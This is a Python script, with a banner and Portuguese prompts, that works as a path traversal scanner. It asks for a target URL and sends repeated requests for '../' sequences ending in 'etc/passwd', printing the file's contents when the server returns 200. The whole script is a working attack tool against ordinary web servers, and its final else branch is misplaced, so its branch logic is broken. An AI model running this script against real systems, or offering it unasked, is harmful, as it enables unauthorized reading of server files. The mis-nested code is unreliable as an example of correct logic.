import requests
import random

banner = """ 
████   ███  █████ █   █     ████  ███   ███  █   █ █   █ █████ ████    
█░░░█ █ ░░█  ░█░░░█░  █░   █ ░░░░█ ░░░ █ ░░█ ██  █░██  █░█░░░░░█░░░█   
████░░█████░  █░░░█████░░   ███░░█░ ░░░█████░█░█ █░█░█ █░████░░████░░  
█░░░░ █░░░█░░ █░░ █░░░█░░    ░░█ █░░   █░░░█░█░░██░█░░██░█░░░░ █░░█░ ░ 
█░░░░░█░░░█░░ █░░ █░░░█░░  ████░░ ███  █░░░█░█░░ █░█░░ █░█████░█░░░█░  
 ░░    ░░  ░░  ░░  ░░  ░░   ░░░░ ░ ░░░  ░░  ░░░░  ░░░░  ░░░░░░░ ░░  ░  
  ░     ░   ░   ░   ░   ░    ░░░░   ░░░  ░   ░ ░   ░ ░   ░ ░░░░░ ░   ░  """
  
print(banner)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

print("=" * 72)
url = input("URL: ")
request_number = int(input("Número de requisições: "))
request_aceptable = int(input("Código de resposta aceitável: "))
if not url.endswith('/'):
    url += '/'

response = requests.get(url, headers=headers)

if response.status_code == 200 or response.status_code == request_aceptable:
    vulnerable = False
    
    for i in range (request_number):
        payload_path_traversal = "../" * random.randint(1, 30) + "etc/passwd"
        repete = requests.get(url + payload_path_traversal, headers=headers)
        print(f"request {i+1}: {repete.status_code} - {url + payload_path_traversal}")
        
        if repete.status_code == 200:
            print("[+] Vulnerabilidade de Path Traversal encontrada! | Conteudo do arquivo /etc/passwd:")
            print("=" * 50)
            print(repete.text)
            print("=" * 50)
            vulnerable = True
            break
    
    if not vulnerable:
        print("[-] Nenhuma vulnerabilidade de Path Traversal encontrada.")
        
    else:
        print(f"[-]: {response.status_code}")
